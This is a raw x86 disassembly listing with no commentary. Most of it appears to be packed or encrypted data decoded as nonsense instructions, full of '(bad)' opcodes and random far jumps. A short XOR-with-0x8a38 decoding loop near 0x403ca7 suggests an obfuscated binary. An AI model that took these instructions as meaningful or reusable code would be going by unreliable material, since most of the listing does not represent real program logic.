  403a4c:	xchg   esp,eax
  403a4d:	out    0xcd,al
  403a4f:	out    dx,eax
  403a50:	add    BYTE PTR [eax+ebx*4-0x7d26bc27],ch
  403a57:	cmp    ch,ch
  403a59:	push   edi
  403a5a:	cmp    eax,0x52108b13
  403a5f:	call   0x944:0x1c07328f
  403a66:	in     ax,0x1e
  403a69:	mov    al,ds:0x78f40948
  403a6e:	and    eax,DWORD PTR [edx-0x45]
  403a71:	or     al,0x8e
  403a73:	dec    ebx
  403a74:	shl    ah,1
  403a76:	push   ecx
  403a77:	jo     0x403a9c
  403a79:	out    dx,al
  403a7a:	pop    ebx
  403a7b:	jns    0x403aa9
  403a7d:	adc    eax,0xb2ce05e9
  403a82:	call   0x4bc4bb92
  403a87:	inc    edx
  403a88:	and    ch,BYTE PTR [ecx-0x63]
  403a8b:	xlat   BYTE PTR ds:[ebx]
  403a8c:	in     al,0x1a
  403a8e:	std    
  403a8f:	push   esi
  403a90:	or     dh,bl
  403a92:	aad    0xde
  403a94:	leave  
  403a95:	pop    ss
  403a96:	push   ss
  403a97:	xor    DWORD PTR [ecx-0x41af6c4c],edx
  403a9d:	hlt    
  403a9e:	pop    ebx
  403a9f:	retf   0xec49
  403aa2:	jcxz   0x403afa
  403aa5:	scas   eax,DWORD PTR es:[edi]
  403aa6:	outs   dx,BYTE PTR ds:[esi]
  403aa7:	stos   BYTE PTR es:[edi],al
  403aa8:	psubw  mm0,mm5
  403aab:	inc    eax
  403aac:	mov    ebp,ebp
  403aae:	es loop 0x403b0c
  403ab1:	mov    cl,0xa7
  403ab3:	aam    0xe0
  403ab5:	pop    edi
  403ab6:	fidivr DWORD PTR [eax+0xa]
  403ab9:	or     eax,0x24757663
  403abe:	out    dx,eax
  403abf:	mov    ah,0x78
  403ac1:	and    esi,DWORD PTR [ecx]
  403ac3:	vmwrite ebx,DWORD PTR [edi]
  403ac6:	ja     0x403a7b
  403ac8:	add    eax,0xd8f0d333
  403acd:	sub    DWORD PTR [ecx],edi
  403acf:	sbb    ch,BYTE PTR [ebx-0x7d1e1ec9]
  403ad5:	mov    al,bl
  403ad7:	lods   eax,DWORD PTR ds:[esi]
  403ad8:	mov    ch,0x6f
  403ada:	test   al,0x70
  403adc:	stc    
  403add:	adc    BYTE PTR [ebp+0x7f2cb569],bl
  403ae3:	push   ebx
  403ae4:	jp     0x403ac1
  403ae6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ae7:	mov    eax,ds:0x95e68e8d
  403aec:	(bad)  
  403aed:	popa   
  403aee:	jge    0x403aca
  403af0:	mov    bh,0x83
  403af2:	call   0xd6b8:0xb723a297
  403af9:	std    
  403afa:	in     al,0x43
  403afc:	lea    edi,[esi]
  403afe:	lods   eax,DWORD PTR ds:[esi]
  403aff:	nop
  403b00:	(bad)  
  403b01:	(bad)  
  403b02:	or     BYTE PTR [esi+ecx*4],bl
  403b05:	leave  
  403b06:	adc    BYTE PTR [edx-0x2f],bl
  403b09:	fnstsw WORD PTR [eax-0x31ff9423]
  403b0f:	mov    ds:0x429746c9,al
  403b14:	jb     0x403aba
  403b16:	rol    DWORD PTR [ebx],1
  403b18:	(bad)  
  403b19:	adc    ebp,DWORD PTR [ecx-0x596076be]
  403b1f:	fdivrp st(3),st
  403b21:	lods   al,BYTE PTR ds:[esi]
  403b22:	in     al,0xe9
  403b24:	adc    BYTE PTR [ebp+0x2b],dl
  403b27:	jo     0x403b11
  403b29:	pop    ebx
  403b2a:	adc    eax,esi
  403b2c:	fwait
  403b2d:	(bad)  
  403b2e:	push   0x1a5e9f6
  403b33:	xchg   DWORD PTR [ecx-0x379e274e],ecx
  403b39:	fdiv   DWORD PTR [ebx-0x7fd3e268]
  403b3f:	add    DWORD PTR [eax-0x35],edi
  403b42:	cmp    BYTE PTR [edx+0x15],bl
  403b45:	nop
  403b46:	hlt    
  403b47:	push   0xc2cafeda
  403b4c:	mov    al,0xc7
  403b4e:	out    0x5a,al
  403b50:	ins    DWORD PTR es:[edi],dx
  403b51:	cwde   
  403b52:	xlat   BYTE PTR ds:[bx]
  403b54:	test   al,0xa6
  403b56:	mov    eax,DWORD PTR ds:[ebx+0x1def5e40]
  403b5d:	jno    0x403b82
  403b5f:	ins    DWORD PTR es:[edi],dx
  403b60:	daa    
  403b61:	xor    eax,0x6b124bc
  403b66:	int    0x42
  403b68:	(bad)  
  403b69:	in     eax,dx
  403b6a:	fcmovb st,st(5)
  403b6c:	sbb    BYTE PTR [eax+0x41],dl
  403b6f:	xchg   DWORD PTR [esi+ecx*4+0x1776c89c],edi
  403b76:	jb     0x403bf6
  403b78:	cmp    eax,0x66e1c547
  403b7d:	ror    DWORD PTR [edi+0x34],1
  403b80:	clc    
  403b81:	sti    
  403b82:	push   0xb811ba0b
  403b87:	xor    eax,0x1819eb2f
  403b8c:	inc    esp
  403b8d:	js     0x403be4
  403b8f:	popf   
  403b90:	into   
  403b91:	retf   
  403b92:	jmp    0xd171:0x1d8d8f96
  403b99:	std    
  403b9a:	out    0x69,al
  403b9c:	mov    edx,0xf72f6e09
  403ba1:	add    BYTE PTR [ecx+edx*1+0x1e608e6d],ah
  403ba8:	lds    ebx,FWORD PTR [edx+0x78a68932]
  403bae:	dec    DWORD PTR [eax+0x63]
  403bb1:	std    
  403bb2:	popa   
  403bb3:	mov    cl,0x7b
  403bb5:	xchg   DWORD PTR [eax-0x1f],edi
  403bb8:	add    BYTE PTR [edx-0x572e903b],cl
  403bbe:	mov    ds:0x9c1299f,al
  403bc3:	cmp    BYTE PTR [edi-0x3e],cl
  403bc6:	rcr    DWORD PTR [edx-0x6e5c9b43],cl
  403bcc:	inc    DWORD PTR [ecx]
  403bce:	and    DWORD PTR [eax],esi
  403bd0:	xchg   DWORD PTR [esi],ebp
  403bd2:	dec    ebx
  403bd3:	scas   al,BYTE PTR es:[edi]
  403bd4:	inc    ebp
  403bd5:	ins    BYTE PTR es:[edi],dx
  403bd6:	test   BYTE PTR ds:0x303e73ec,dh
  403bdc:	inc    ebp
  403bdd:	div    DWORD PTR [edi-0x55]
  403be0:	adc    al,0x72
  403be2:	test   BYTE PTR [edx+0x4a],ah
  403be5:	fisub  WORD PTR [ecx-0x63daeb60]
  403beb:	jmp    0xff2c0f79
  403bf0:	into   
  403bf1:	ds (bad) 
  403bf3:	jmp    0x90b683e3
  403bf8:	xor    ebp,esi
  403bfa:	stc    
  403bfb:	xchg   esp,eax
  403bfc:	mov    bl,0xa0
  403bfe:	inc    esp
  403bff:	push   ecx
  403c00:	ss ja  0x403bd6
  403c03:	fcmovnbe st,st(6)
  403c05:	and    al,0x3b
  403c07:	sub    bl,BYTE PTR [edi]
  403c09:	scas   eax,DWORD PTR es:[edi]
  403c0a:	mov    bh,BYTE PTR [eax+eiz*8+0x1a8aefe4]
  403c11:	sub    BYTE PTR [ecx+0x2b],ch
  403c14:	in     eax,dx
  403c15:	dec    ebp
  403c16:	adc    al,0x46
  403c18:	pop    ebx
  403c19:	add    al,0x87
  403c1b:	ins    BYTE PTR es:[edi],dx
  403c1c:	xchg   ebx,eax
  403c1d:	xor    ah,BYTE PTR [eax+0x2546d25e]
  403c23:	rcl    BYTE PTR [esi],1
  403c25:	jae    0x403ca0
  403c27:	(bad)  
  403c29:	aad    0xff
  403c2b:	scas   al,BYTE PTR es:[edi]
  403c2c:	or     esp,ecx
  403c2e:	xchg   edx,eax
  403c2f:	lahf   
  403c30:	mov    esp,0x5be61e80
  403c35:	push   es
  403c36:	mov    bl,BYTE PTR [esi-0x29]
  403c39:	and    DWORD PTR [eax+0x4f],0xffffffbe
  403c3d:	retf   0x3872
  403c40:	test   BYTE PTR [ecx-0x477cf405],ch
  403c46:	(bad)  
  403c47:	and    ebx,edx
  403c49:	jo     0x403c0e
  403c4b:	stos   BYTE PTR es:[edi],al
  403c4c:	daa    
  403c4d:	jns    0x403c5d
  403c4f:	jg     0x403c09
  403c51:	test   BYTE PTR [eax+eax*1+0x54576cfe],bh
  403c58:	adc    eax,0xacb7b5f
  403c5d:	sbb    esp,DWORD PTR [ecx-0x11ea89d4]
  403c63:	push   ss
  403c64:	adc    edi,ebp
  403c66:	inc    edi
  403c67:	std    
  403c68:	mov    cl,0xc3
  403c6a:	lahf   
  403c6b:	shl    dh,cl
  403c6d:	push   eax
  403c6e:	das    
  403c6f:	dec    ecx
  403c70:	loop   0x403bfe
  403c72:	adc    al,0xf6
  403c74:	push   ebp
  403c75:	add    DWORD PTR [edx+0x295c4e30],ebx
  403c7b:	(bad)  
  403c7c:	dec    DWORD PTR [ecx]
  403c7e:	jmp    0x9de831a1
  403c83:	push   gs
  403c85:	stc    
  403c86:	dec    edx
  403c87:	loope  0x403cd3
  403c89:	mov    ecx,0xe86b2a32
  403c8e:	js     0x403c32
  403c90:	xchg   edi,eax
  403c91:	(bad)  
  403c92:	add    al,0xff
  403c94:	in     eax,dx
  403c95:	jae    0x403c61
  403c97:	jne    0x403cd6
  403c99:	add    eax,0x2c1101b7
  403c9e:	sub    al,0xac
  403ca0:	mov    edx,0xfc70366
  403ca5:	mov    bh,0xc0
  403ca7:	mov    DWORD PTR [ebp-0x14],eax
  403caa:	mov    eax,DWORD PTR [ebp+0x8]
  403cad:	movzx  eax,WORD PTR [eax+edx*4]
  403cb1:	xor    eax,0x8a38
  403cb6:	add    eax,edi
  403cb8:	mov    edi,DWORD PTR [ebp-0x14]
  403cbb:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403cbf:	mov    eax,DWORD PTR [ebp-0xc]
  403cc2:	inc    edx
  403cc3:	cmp    edx,eax
  403cc5:	jne    0x40389a
  403ccb:	pop    edi
  403ccc:	pop    ebx
  403ccd:	mov    eax,DWORD PTR [ebp-0x8]
  403cd0:	mov    edx,DWORD PTR [ebp+0x10]
  403cd3:	xor    eax,ecx
  403cd5:	add    eax,esi
  403cd7:	mov    DWORD PTR [edx],eax
  403cd9:	jmp    0x4040ce
  403cde:	mov    ch,0xd5
  403ce0:	or     dh,al
  403ce2:	push   0xfffffff1
  403ce4:	jge    0x403d43
  403ce6:	inc    eax
  403ce7:	xchg   ecx,eax
  403ce8:	add    esp,0x6a0b17e8
  403cee:	mov    ebx,0x567e7e1f
  403cf3:	jns    0x403d73
  403cf5:	jle    0x403cee
  403cf7:	sbb    esi,DWORD PTR [edx+0x65692f17]
  403cfd:	icebp  
  403cfe:	and    edi,esp
  403d00:	mov    ?,WORD PTR [ecx]
  403d02:	sub    BYTE PTR [ebp+0x8afbf28],al
  403d08:	dec    edi
  403d09:	mov    edx,0xb78d0a32
  403d0e:	int3   
  403d0f:	jl     0x403cce
  403d11:	mov    al,0x36
  403d13:	sar    DWORD PTR fs:[edi-0x54],cl
  403d17:	stos   BYTE PTR es:[edi],al
  403d18:	leave  
  403d19:	(bad)  
  403d1a:	xor    al,0x8b
  403d1c:	in     al,dx
  403d1d:	push   edx
  403d1e:	push   esp
  403d1f:	fimul  WORD PTR [ebp-0x6e]
  403d22:	or     bh,BYTE PTR [edi+eiz*2+0x5d]
  403d26:	out    0x80,al
  403d28:	mov    bl,0x72
  403d2a:	sub    ebp,DWORD PTR [esi+0x5faddf75]
  403d30:	stc    
  403d31:	add    al,0x21
  403d33:	fdiv   QWORD PTR [esi]
  403d35:	mul    DWORD PTR [edx+edi*4+0x60]
  403d39:	addr16 mov dh,bl
  403d3c:	outs   dx,BYTE PTR ds:[esi]
  403d3d:	test   eax,0xbe43e030
  403d42:	push   edx
  403d43:	lods   eax,DWORD PTR ds:[esi]
  403d44:	xchg   esp,eax
  403d45:	mov    bl,0xeb
  403d47:	xchg   ebx,eax
  403d48:	add    al,BYTE PTR [eax]
  403d4a:	ds pop ebp
  403d4c:	test   DWORD PTR [eax+0x21],esp
  403d4f:	jbe    0x403d68
  403d51:	(bad)  
  403d53:	int3   
  403d54:	xor    BYTE PTR [esi-0x68fc1f9b],al
  403d5a:	dec    edi
  403d5b:	xor    edx,ebp
  403d5d:	ret    0x1547
  403d60:	loopne 0x403ce8
  403d62:	test   BYTE PTR [ebx],bh
  403d64:	nop
  403d65:	inc    edi
  403d66:	or     dh,BYTE PTR [ecx+0x6d]
  403d69:	mov    dh,0x5f
  403d6b:	bound  esi,QWORD PTR [edi+0x33d3924]
  403d71:	pop    esp
  403d72:	aad    0xa1
  403d74:	jo     0x403dbe
  403d76:	leave  
  403d77:	pop    DWORD PTR [ebp-0x2f2e6cc7]
  403d7d:	push   0xc3ce3268
  403d82:	cld    
  403d83:	inc    ebx
  403d84:	ss leave 
  403d86:	jecxz  0x403d92
  403d88:	pop    edx
  403d89:	lahf   
  403d8a:	stos   BYTE PTR es:[edi],al
  403d8b:	fs sub al,0x48
  403d8e:	jmp    0x42d2:0xf07e4567
  403d95:	mov    dh,0x8d
  403d97:	fdivr  DWORD PTR [eax-0x51bcf185]
  403d9d:	inc    edx
  403d9e:	sub    al,0xa3
  403da0:	and    DWORD PTR [edi],esi
  403da2:	cld    
  403da3:	jmp    0x11f4:0x6606437f
  403daa:	mov    ds:0xf30bdb56,eax
  403daf:	(bad)  
  403db1:	stos   BYTE PTR es:[edi],al
  403db2:	pusha  
  403db3:	ja     0x403dbc
  403db5:	rcl    BYTE PTR [ecx-0x192f99d6],0x79
  403dbc:	cmp    ebp,DWORD PTR [ebx+0x14]
  403dbf:	xchg   esi,eax
  403dc0:	leave  
  403dc1:	fstp   TBYTE PTR [ebp+0x3f512a83]
  403dc7:	(bad)  
  403dc8:	shl    cl,1
  403dca:	pop    ebp
  403dcb:	fiadd  DWORD PTR [eax]
  403dcd:	pop    ds
  403dce:	pop    edx
  403dcf:	nop
  403dd0:	leave  
  403dd1:	mov    eax,ds:0xe7784a4d
  403dd6:	lock jo 0x403d85
  403dd9:	add    eax,0x4cf3afb9
  403dde:	repnz and edi,eax
  403de1:	or     edx,DWORD PTR [esi-0x67908796]
  403de7:	sahf   
  403de8:	pushf  
  403de9:	aaa    
  403dea:	mov    ebp,0x634d5ebf
  403def:	add    eax,DWORD PTR [edx]
  403df1:	add    edx,ecx
  403df3:	push   0xffffffaf
  403df5:	xor    al,0xc6
  403df7:	sahf   
  403df8:	dec    esp
  403df9:	xchg   DWORD PTR [edx],esi
  403dfb:	xor    ch,BYTE PTR [edx+ebx*1-0x51]
  403dff:	inc    edx
  403e00:	fild   DWORD PTR [ecx+ebp*2+0x1b]
  403e04:	fidivr WORD PTR [ebp+0x6554b844]
  403e0a:	icebp  
  403e0b:	lahf   
  403e0c:	loopne 0x403dc0
  403e0e:	mov    ecx,0x7b4d3c50
  403e13:	pop    edi
  403e14:	inc    ecx
  403e15:	add    ecx,edx
  403e17:	push   DWORD PTR fs:[edi]
  403e1a:	xchg   edi,eax
  403e1b:	mov    esp,0x2a136c1b
  403e20:	dec    edi
  403e21:	fs jmp 0x1107:0xf46b9728
  403e29:	mov    ds:0x6bd20651,eax
  403e2e:	cmp    eax,0x158437d6
  403e33:	dec    esi
  403e34:	push   esi
  403e35:	mov    ds:0x87546fb2,al
  403e3a:	icebp  
  403e3b:	fistp  WORD PTR [edi]
  403e3d:	push   cs
  403e3e:	in     eax,dx
  403e3f:	shr    DWORD PTR [edx-0x6b05a28d],1
  403e45:	dec    eax
  403e46:	nop
  403e47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e48:	mov    ch,0x13
  403e4a:	stc    
  403e4b:	adc    edi,ebx
  403e4d:	mov    ecx,DWORD PTR [ecx+eax*8-0x2acd5738]
  403e54:	dec    ebx
  403e55:	outs   dx,DWORD PTR ds:[esi]
  403e56:	aad    0x7b
  403e58:	retf   
  403e59:	inc    esp
  403e5a:	pop    edi
  403e5b:	xor    DWORD PTR [ecx],ebx
  403e5d:	pop    esi
  403e5e:	push   ebp
  403e5f:	mov    edi,0x6be6eea8
  403e64:	and    BYTE PTR [eax-0x79],bl
  403e67:	xor    ebx,ecx
  403e69:	xor    esi,DWORD PTR [ebp+0x7a]
  403e6c:	dec    ebx
  403e6d:	xor    eax,0x63fe758
  403e72:	imul   esi,DWORD PTR [ebx],0xffffffc0
  403e75:	out    0x18,al
  403e77:	loop   0x403e00
  403e79:	dec    ecx
  403e7a:	(bad)  
  403e7c:	dec    eax
  403e7d:	into   
  403e7e:	cmc    
  403e7f:	jle    0x403e51
  403e81:	sub    DWORD PTR [ebx-0x44d8bddd],ebx
  403e87:	js     0x403eeb
  403e89:	push   ebx
  403e8a:	jne    0x403e26
  403e8c:	inc    ebx
  403e8d:	in     eax,dx
  403e8e:	xchg   edi,eax
  403e8f:	and    ebp,DWORD PTR [edx]
  403e91:	push   esi
  403e92:	(bad)  
  403e93:	lds    ecx,FWORD PTR [edx]
  403e95:	mov    ecx,0x65a6ea9a
  403e9a:	jo     0x403eb2
  403e9c:	jg     0x403ebf
  403e9e:	sub    al,0x32
  403ea0:	push   es
  403ea1:	pop    ebp
  403ea2:	jbe    0x403eb4
  403ea4:	xchg   ecx,eax
  403ea5:	(bad)  
  403ea6:	mov    al,ds:0xb1a616e0
  403eab:	jae    0x403ef4
  403ead:	sbb    edx,esp
  403eaf:	fstp   st(4)
  403eb1:	dec    esi
  403eb2:	shl    DWORD PTR [edx+0x79],1
  403eb5:	push   0xfffffff8
  403eb7:	mov    al,ds:0x9c56ea2d
  403ebc:	lds    edi,FWORD PTR [ecx-0x6]
  403ebf:	fucom  st(2)
  403ec1:	sahf   
  403ec2:	push   edi
  403ec3:	nop
  403ec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ec5:	(bad)  
  403ec6:	push   edx
  403ec7:	or     al,0xf9
  403eca:	inc    esp
  403ecb:	sahf   
  403ecc:	dec    ebx
  403ecd:	dec    ebp
  403ece:	into   
  403ecf:	ja     0x403eb8
  403ed1:	jns    0x403e96
  403ed3:	pop    ss
  403ed4:	push   0x7ef4a609
  403ed9:	push   ds
  403eda:	lock ficomp DWORD PTR [ebx+0x32]
  403ede:	and    DWORD PTR [eax+ebx*8+0x3c721b5e],ebx
  403ee5:	lea    eax,[esp+ebx*4]
  403ee8:	jno    0x403f10
  403eea:	imul   ebx,esp,0x37
  403eed:	cmp    edi,DWORD PTR [eax-0x7f]
  403ef0:	jecxz  0x403eb3
  403ef2:	cwde   
  403ef3:	les    ecx,FWORD PTR [esi-0x7b]
  403ef6:	test   bh,bh
  403ef8:	nop
  403ef9:	mov    eax,ds:0xcc5a8aba
  403efe:	sti    
  403eff:	das    
  403f00:	popf   
  403f01:	inc    ebx
  403f02:	fsub   DWORD PTR [edi]
  403f04:	ins    BYTE PTR es:[edi],dx
  403f05:	jns    0x403f55
  403f07:	sti    
  403f08:	mov    BYTE PTR [ebp-0x4f],ah
  403f0b:	shl    DWORD PTR ds:0x1695e1c6,cl
  403f11:	adc    DWORD PTR [eax+eax*4+0x31],eax
  403f15:	pop    esi
  403f16:	jmp    0x3687:0x4279687d
  403f1d:	inc    ecx
  403f1e:	dec    ebp
  403f1f:	adc    ecx,ebx
  403f21:	jns    0x403f11
  403f23:	inc    ecx
  403f24:	adc    eax,0x7ce8d89a
  403f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f2a:	imul   edx,DWORD PTR ds:0x1dd41029,0x9d981d36
  403f34:	stos   DWORD PTR es:[edi],eax
  403f35:	imul   edi
  403f37:	in     al,0x9
  403f39:	mov    al,0xf0
  403f3b:	imul   esi,DWORD PTR [ebx+edx*8],0xe7a9481b
  403f42:	test   eax,0x9e23091d
  403f47:	enter  0x1fa4,0xb5
  403f4b:	ds lock and eax,0x635f4bb1
  403f52:	aam    0xea
  403f54:	into   
  403f55:	inc    ecx
  403f56:	das    
  403f57:	ror    DWORD PTR [ebx-0x5faa0af5],cl
  403f5d:	ret    0x1746
  403f60:	jmp    0x403fcd
  403f62:	push   edx
  403f63:	popa   
  403f64:	in     al,dx
  403f65:	cmp    dh,cl
  403f67:	outs   dx,BYTE PTR ds:[esi]
  403f68:	aam    0x6c
  403f6a:	or     DWORD PTR [eax-0x7bba61b2],esp
  403f70:	dec    esp
  403f71:	pop    ebx
  403f72:	shl    DWORD PTR [ecx],0xf9
  403f75:	lock jbe 0x403f70
  403f78:	scas   eax,DWORD PTR es:[edi]
  403f79:	cli    
  403f7a:	sbb    ecx,DWORD PTR [edx+0x2811aa01]
  403f80:	(bad)  
  403f81:	in     eax,0x7d
  403f83:	mov    dh,BYTE PTR [ebx+0x5e]
  403f86:	int3   
  403f87:	pop    ss
  403f88:	push   0xc01b7175
  403f8d:	mov    cl,0x7d
  403f8f:	out    0xb2,al
  403f91:	cdq    
  403f92:	push   eax
  403f93:	and    cl,ch
  403f95:	and    DWORD PTR [edi+0x58],ebp
  403f98:	loop   0x403faf
  403f9a:	ret    
  403f9b:	cld    
  403f9c:	int    0x70
  403f9e:	dec    edi
  403f9f:	sahf   
  403fa0:	xor    edi,DWORD PTR es:[ebx]
  403fa3:	pop    ebx
  403fa4:	icebp  
  403fa5:	shl    DWORD PTR [esi+ebp*1],cl
  403fa8:	lock sub DWORD PTR [ecx+0x25],ecx
  403fac:	popf   
  403fad:	outs   dx,BYTE PTR ds:[esi]
  403fae:	fwait
  403faf:	call   0x4bbac02f
  403fb4:	imul   esp,DWORD PTR [edi],0x303cc772
  403fba:	and    dl,BYTE PTR [esi+0x65]
  403fbd:	call   0xb26e:0xfb65ad11
  403fc4:	push   edi
  403fc5:	mov    bh,0x15
  403fc7:	and    al,0x90
  403fc9:	push   ss
  403fca:	outs   dx,DWORD PTR ds:[esi]
  403fcb:	dec    edi
  403fcc:	cmc    
  403fcd:	pop    eax
  403fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fcf:	clc    
  403fd0:	cmp    BYTE PTR [eiz*4-0x7f6f4738],cl
  403fd7:	xor    DWORD PTR [ebp-0x6e],ebp
  403fda:	cmc    
  403fdb:	ror    ch,cl
  403fdd:	jmp    0x403f64
  403fdf:	or     eax,0x115b16a5
  403fe4:	push   edx
  403fe5:	sbb    al,0xa4
  403fe7:	jo     0x404040
  403fe9:	dec    DWORD PTR [edi+eiz*8]
  403fec:	mov    edx,0xc2849648
  403ff1:	int    0x6d
  403ff3:	mov    al,ds:0x1f38bd9b
  403ff8:	sub    ch,BYTE PTR ds:0x4e9e60b5
  403ffe:	and    al,0x63
  404000:	xor    ah,BYTE PTR [ecx+eiz*1+0x48]
  404004:	xor    eax,0x49bdda2c
  404009:	(bad)  
  40400a:	fwait
  40400b:	mov    bh,0x3a
  40400d:	repz jae 0x40402c
  404010:	mov    ?,WORD PTR [ebx+edx*1-0xcdeb6aa]
  404017:	ror    BYTE PTR [edx+0x2df927ef],1
  40401d:	mov    al,0xe2
  40401f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404020:	dec    ecx
  404021:	hlt    
  404022:	enter  0x23f8,0x9e
  404026:	scas   eax,DWORD PTR es:[edi]
  404027:	fwait
  404028:	mov    ds:0xec42ae83,al
  40402d:	mov    cl,0xc0
  40402f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404030:	dec    edx
  404031:	shr    ch,0x7f
  404034:	mov    eax,ss:0x2601ce36
  40403a:	xor    eax,0x2f5dff9f
  40403f:	stc    
  404040:	mov    eax,0x10094a3a
  404045:	hlt    
  404046:	test   eax,0x84c42b8a
  40404b:	jno    0x404070
  40404d:	mov    WORD PTR [edx+0x76],gs
  404050:	aas    
  404051:	mov    cl,0x8b
  404053:	sbb    ebx,DWORD PTR [ecx-0x28ce3835]
  404059:	sub    BYTE PTR [edx-0x7d],0x7a
  40405d:	and    DWORD PTR [eax+eax*4],edx
  404060:	inc    edx
  404061:	jg     0x40404f
  404063:	jno    0x4040de
  404065:	je     0x404068
  404067:	mov    ebp,0x81ee6f9f
  40406c:	push   edi
  40406d:	(bad)  
  40406e:	test   DWORD PTR [ebp+eiz*4-0x44571635],0xb04a0603
  404079:	sub    dh,BYTE PTR [esi+eiz*8+0x1911864d]
  404080:	mov    ah,0xc2
  404082:	inc    ebp
  404083:	jg     0x4040bf
  404085:	mov    edi,0x72c097d2
  40408a:	cmc    
  40408b:	mov    ds:0xe73cf4d1,al
  404090:	mov    dl,0x71
  404092:	sub    DWORD PTR [esi-0x7aee92cd],ebx
  404098:	lahf   
  404099:	push   ecx
  40409a:	imul   esp,DWORD PTR ds:0x55ba,0x45a5d78f
  4040a3:	shr    BYTE PTR [ebp-0x660ce04e],cl
  4040a9:	add    eax,0xd68541c
  4040ae:	sbb    DWORD PTR [ecx+0x17],ecx
  4040b1:	outs   dx,DWORD PTR ds:[esi]
  4040b2:	addr16 fwait
  4040b4:	addr16 add eax,0xfaa45ae6
  4040ba:	fist   DWORD PTR [esi]
  4040bc:	test   BYTE PTR [eax-0x5f],cl
  4040bf:	adc    eax,0xf6921d6
  4040c4:	repz mov eax,0x8b38de44
  4040ca:	pusha  
  4040cb:	test   al,dl
  4040cd:	cmp    eax,0x33f8458b
  4040d2:	rol    DWORD PTR [ebx],0xc6
  4040d5:	mov    DWORD PTR [ebp+0x8],eax
  4040d8:	mov    eax,DWORD PTR [ebp+0x8]
  4040db:	jmp    0x4044d0
  4040e0:	pop    edx
  4040e1:	ret    0x1375
  4040e4:	jge    0x4040a3
  4040e6:	ins    BYTE PTR es:[edi],dx
  4040e7:	jae    0x404096
  4040e9:	test   BYTE PTR [eax-0x25ba333],ah
  4040ef:	jmp    0x7956:0x7e7e1b93
  4040f6:	jle    0x404176
  4040f8:	jbe    0x4040c0
  4040fa:	push   esp
  4040fb:	cmp    BYTE PTR [edi-0x60],ch
  4040fe:	imul   esp,DWORD PTR [edi+0x5d8ab6eb],0x46
  404105:	sbb    edx,eax
  404107:	jl     0x404101
  404109:	jmp    DWORD PTR [ebx]
  40410b:	repz test eax,0x5167eb51
  404111:	out    dx,al
  404112:	sbb    eax,0xf3991a8
  404117:	fst    DWORD PTR [esi-0x34]
  40411a:	(bad)  
  40411b:	ins    DWORD PTR es:[edi],dx
  40411c:	fsubr  QWORD PTR [eax+0x169fc456]
  404122:	cmp    DWORD PTR [eax],ebx
  404124:	jmp    0x404123
  404126:	imul   esi,DWORD PTR [eax+0x4c],0xd9e5aeb6
  40412d:	inc    ebx
  40412e:	dec    ecx
  40412f:	fisttp QWORD PTR gs:[ecx-0x6180ce6a]
  404136:	and    eax,0xebac8481
  40413b:	adc    BYTE PTR [esi],0xde
  40413e:	(bad)  
  40413f:	and    esi,esi
  404141:	ret    
  404142:	xchg   ecx,eax
  404143:	jno    0x404170
  404145:	mov    ebx,0xe95f5d96
  40414a:	repz pusha 
  40414c:	gs out 0x7c,al
  40414f:	mov    WORD PTR [edx],fs
  404151:	sbb    bl,BYTE PTR [edx]
  404153:	ja     0x404105
  404155:	mov    esp,DWORD PTR [ecx]
  404157:	ins    DWORD PTR es:[edi],dx
  404158:	imul   edx,DWORD PTR ss:[ebp+0x414a891],0xb596eca7
  404163:	mov    ebx,0xf9977fc3
  404168:	xor    esi,DWORD PTR [esi+0x75]
  40416b:	aam    0xc
  40416d:	mul    BYTE PTR [edi+0x5a2e3f95]
  404173:	jae    0x404179
  404175:	(bad)  
  404176:	das    
  404177:	add    al,0x6a
  404179:	mov    esi,DWORD PTR [eax-0x34]
  40417c:	repz pop edi
  40417e:	xchg   edx,eax
  40417f:	fcmovu st,st(5)
  404181:	mov    bl,0xd5
  404183:	sbb    eax,0x30390b99
  404188:	adc    bh,BYTE PTR [edi-0x34]
  40418b:	in     eax,0x13
  40418d:	push   eax
  40418e:	cmp    eax,ebp
  404190:	dec    edx
  404191:	push   esp
  404192:	leave  
  404193:	pop    ss
  404194:	lds    eax,FWORD PTR [esi+0x2ff80910]
  40419a:	cmp    al,dh
  40419c:	xchg   edi,eax
  40419d:	loopne 0x404174
  40419f:	jmp    0xd81a:0x11016418
  4041a6:	ss cmp ebx,edi
  4041a9:	sar    DWORD PTR [ecx],0x5f
  4041ac:	inc    esi
  4041ad:	jns    0x404158
  4041af:	sahf   
  4041b0:	retf   0x36cc
  4041b3:	or     ch,cl
  4041b5:	not    DWORD PTR [ebp+0x1e]
  4041b8:	sbb    ah,ah
  4041ba:	pop    ebx
  4041bb:	sub    al,0x40
  4041bd:	ficomp WORD PTR [edx-0x13]
  4041c0:	adc    al,0x8d
  4041c2:	jbe    0x404229
  4041c4:	mov    ds:0x46087b15,al
  4041c9:	sbb    dl,BYTE PTR [esi+0x3b]
  4041cc:	jmp    0xf8ed:0x2629db37
  4041d3:	cs retf 
  4041d5:	pusha  
  4041d6:	adc    ecx,DWORD PTR [ebx+0x24ae8eb]
  4041dc:	jl     0x404219
  4041de:	mov    DWORD PTR [eax+0x7d],ebx
  4041e1:	or     cl,dl
  4041e3:	jmp    0xbc76:0xd4073ed0
  4041ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041eb:	shl    DWORD PTR [ebx-0x42],1
  4041ee:	adc    BYTE PTR [edi+ebp*1-0xabc609a],0x1c
  4041f6:	sub    BYTE PTR [esi],ah
  4041f8:	inc    edx
  4041f9:	jl     0x404220
  4041fb:	sub    al,0xac
  4041fd:	sub    cl,BYTE PTR [esi+ebp*8+0x77c8506]
  404204:	fcom   QWORD PTR [esi+0x345a453c]
  40420a:	scas   al,BYTE PTR es:[edi]
  40420b:	mov    edx,0xbb943e3e
  404210:	pop    esp
  404211:	bound  esi,QWORD PTR [ebx+0x31919f12]
  404217:	sub    ecx,ebx
  404219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40421a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40421b:	loopne 0x40423f
  40421d:	out    0xe4,al
  40421f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404220:	shr    eax,cl
  404222:	and    al,0x49
